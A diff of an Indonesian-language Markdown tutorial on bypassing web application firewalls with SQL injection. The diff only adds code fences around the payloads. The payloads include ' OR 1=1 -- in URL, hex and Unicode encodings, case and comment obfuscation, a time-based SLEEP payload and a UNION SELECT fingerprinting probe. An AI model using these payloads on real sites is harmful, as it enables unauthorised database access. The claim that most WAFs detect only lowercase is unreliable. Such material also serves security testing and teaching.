@@ -209,48 +209,48 @@ SQL Injection masih menjadi salah satu teknik serangan paling umum, dan WAF mode
 Mengubah karakter berbahaya menjadi bentuk URL-encoded untuk menghindari deteksi langsung.
 
 ✅ Payload Tanpa Encoding:
-
+```
 ' OR 1=1 --
-
+```
 ✅ Payload URL Encoded:
-
+```
 %27%20OR%201%3D1%20--
-
+```
 1.2. Hex Encoding
 
 Mengubah string ke dalam format hexadecimal.
 ✅ Payload Hex Encoded:
-
+```
 0x27204F5220313D31202D2D
-
+```
 1.3. Unicode Bypass
 
 Mengubah karakter payload menjadi Unicode untuk melewati filter karakter tertentu.
 ✅ Payload Unicode:
-
+```
 %u0027 OR 1=1 --
-
+```
 1.4. Case Manipulation
 
 Sebagian besar WAF hanya mendeteksi huruf kecil.
 ✅ Payload Case Manipulation:
-
+```
 SeLeCt * FrOm users WhErE username='admin' --
-
+```
 1.5. Comment-Based Bypass
 
 Menggunakan komentar SQL untuk menyembunyikan karakter tertentu.
 ✅ Payload dengan komentar:
-
+```
 SELECT/**/username,password/**/FROM/**/users/**/WHERE/**/username='admin'
-
+```
 1.6. Time-Based Blind SQLi
 
 Jika WAF memblokir output error, kita bisa menggunakan teknik time-based attack untuk menguji apakah injeksi berhasil.
 ✅ Payload Time-Based SQLi (MySQL):
-
+```
 ' OR SLEEP(5) --
-
+```
 Jika server butuh waktu lebih lama untuk merespons, berarti injeksi berhasil.
 
 1.7. WAF Fingerprinting via SQLi
@@ -258,9 +258,9 @@ Jika server butuh waktu lebih lama untuk merespons, berarti injeksi berhasil.
 Untuk mengetahui filter WAF sebelum bypass, kita bisa mengirimkan payload uji coba dan melihat respons.
 
 ✅ Payload untuk mengetahui apakah UNION SELECT diblokir:
-
+```
 ' UNION SELECT NULL, NULL --
-
+```
 Jika permintaan ditolak, WAF kemungkinan memblokir kata kunci UNION.
 
 
